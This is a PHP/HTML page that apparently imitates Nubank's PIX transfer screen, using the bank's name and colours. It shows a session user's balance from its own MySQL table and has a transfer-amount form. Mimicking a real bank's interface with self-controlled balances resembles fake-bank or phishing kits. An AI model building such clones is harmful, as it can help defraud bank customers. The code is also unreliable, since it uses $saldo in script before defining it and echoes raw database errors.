<?php
session_start();
include 'conexaoatualizada.php'; // Inclua o arquivo de conexão

if (!isset($_SESSION['id'])) {
    header("refresh:0;url=login.php");
    exit;
}
$larguratabela = "98%";
?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="imagens/icone.png" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script>
window.onload = function () {
var valElement = document.getElementById("val");
var a1Image = document.getElementById("a1Image");

a1Image.addEventListener("click", function () {
if (valElement.innerHTML === "<?php echo $saldo; ?>") {
valElement.innerHTML = "••••";
valElement.style.fontSize = "25px";
valElement.style.letterSpacing = "2px"; // Adiciona espaçamento de 2 pixels entre os caracteres
} else {
valElement.innerHTML = "<?php echo $saldo; ?>";
valElement.style.fontSize = "17px";
valElement.style.letterSpacing = "normal"; // Remove o espaçamento entre os caracteres
}
});
};
</script>
<script>
function changeImage(img) {
var imagePath = img.src;
var imageName = imagePath.substring(imagePath.lastIndexOf('/') + 1, imagePath.length);

if (imageName === 'a1.png') {
img.src = 'imagens/a0.png'; // Altere o caminho da imagem clicada
} else {
img.src = 'imagens/a1.png'; // Altere o caminho da imagem normal
}
}
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/3.3.4/jquery.inputmask.bundle.min.js"></script>

<title>Nubank</title>
<link rel="stylesheet" href="estilonu.css">

<style type="text/css">
body {
text-align: center;
margin: 0;
padding: 0;
background-color: #FFF;
}

.texto1 {
font-size: 16px;
color: #666;
font-weight: normal;
line-height: 1;
}

img {
max-width: 100%;
height: auto;
}

.botaoentrar {
background-color: #8A02DB;
cursor: pointer;
text-align: center;
margin: 0px;
padding: 0px;
width: 340px;
font-size: 18px;
background-position: center center;
font-style: normal;
height: 60px;
border-radius: 50px;
text-align: center;
border: 1px none #FFF;
color: #FFF;
}

.fundoimagem tr td table tr td {
background-image: url(03.png);
}

.txt {
font-size: 14px;
}

.fundo {
background-image: url(imagens/inicial.PNG);
background-repeat: no-repeat;
background-position: center top;
background-size: 100%;

}

.topo {
background-color: #771AC9;
}

.topotexto {
font-size: 20px;
color: #FFF;
}

.bases {}

.image-container {
overflow-x: auto;
white-space: nowrap;
}

.image-container img {
display: inline-block;
margin-right: 10px;
/* Adicione um espaçamento entre as imagens */
}

.fatura {
font-size: 18px;
color: #666;
font-family: "Graphik Medium";
}

.limite {
font-size: 13px;
color: #797979;
}

.linha {
width: 100%;
height: 1px;
background-color: #EBEBEB;
border-top-style: none;
border-right-style: none;
border-bottom-style: none;
border-left-style: none;
}

#divFixa {
position: fixed;
bottom: 2px;
/* Ajuste o valor do espaçamento conforme necessário */
width: 285px;
left: 50%;
transform: translateX(-50%);
background-color: rgba(0, 0, 0, 0.0);
opacity: 0.96;
}

.valortransf {
font-size: 34px;
border-top-style: none;
border-right-style: none;
border-bottom-style: none;
border-left-style: none;
color: #000;
}

.linha1 {
width: 100%;
height: 1px;
background-color: #EBEBEB;
border-top-style: none;
border-right-style: none;
border-bottom-style: none;
border-left-style: none;
}

.valorx {
outline: none;
font-size: 34px;
color: #000;
border-top-style: none;
border-right-style: none;
border-bottom-style: none;
border-left-style: none;
width: 75%;
font-family: "Graphik Medium";
}

.linha {
background-image: url(imagens/linha.png);
background-repeat: no-repeat;
background-position: center bottom;
width: 100%;
}
</style>
</head>

<body>
<table width="350" border="0" align="center">
<tr>
<td height="50" align="center">
<table width="350" border="0" align="center">
<tr>
<td><a href="painel2.php"><img src="imagens/x.png" alt="" width="24"></a></td>
<td align="right"><img src="imagens/botoesjuntos.png" width="71"></td>
</tr>
</table>
</td>
</tr>
</table>
<table width="100%" border="0">
<tr>

</tr>
</table>
<table width="350" border="0" align="center">
<tr>
<td>
<form name="form1" id="transferForm" method="post" action="pix_paraquem.php" onsubmit="return validarTransferencia()">
<table width="350" border="0" align="center">
<tr>
<td height="50" align="left"><span class="icon2" style="font-size: 27px; color: #333;">Qual é o valor da<br>
transferência?

</span></td>
</tr>
<tr>
<td height="50" align="left" valign="middle"><span class="icon3" style="font-size: 18px; color: #666; letter-spacing: 0px;">Saldo disponível em conta</span>
<span class="icon3" style="font-size: 16px; color: #585858;"><b> <?php
// Estabelecer conexão com o banco de dados

try {
$pdo = new PDO("mysql:host=$host;dbname=$banco", $usuario, $senhadb);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Consulta SQL
$cpf = $_SESSION['cpf'];
$sql = "SELECT saldo FROM usuarios WHERE cpf = :cpf";

// Preparar a consulta
$stmt = $pdo->prepare($sql);

// Atribuir valor ao parâmetro :cpf
$stmt->bindParam(':cpf', $cpf);

// Executar a consulta
$stmt->execute();

// Obter o resultado da consulta
$resultado = $stmt->fetch();

// Exibir o valor do saldo
$saldo = $resultado['saldo'];
echo "R$ " . number_format($saldo, 2, ',', '.');

} catch (PDOException $e) {
echo "Erro ao conectar ao banco de dados: " . $e->getMessage();
}
?>
</b></span> </td>
</tr>
<tr>
<td height="21" align="left" valign="middle">&nbsp;</td>
</tr>
<tr>
<td align="left" valign="bottom">
<span class="valorx">R$</span>
<input name="valor" type="text" class="valorx" id="valor" onkeypress="return event.charCode >= 48 && event.charCode <= 57" onkeyup="formatarValor(this)" value="0,00" maxlength="14" inputmode="numeric">

<br>

<hr noshade="noshade" class="linha">
<script>
function formatarValor(input) {
var valor = input.value.replace(/\D/g, '');
valor = (valor / 100).toFixed(2).replace('.', ',').replace(/(\d)(?=(\d{3})+(?!\d))/g, '$1.');
input.value = valor;
}
</script>
</td>
</tr>
<tr>
<td align="left" valign="bottom">&nbsp;</td>
</tr>
<tr>
<td height="250" align="right" valign="bottom"><input type="image" name="imageField" id="imageField" src="imagens/botaoproximoroxo.png" style="width: 70px; height: auto;">
</td>
</tr>
</table>
</form>
</td>
</tr>
</table>
</body>
</html>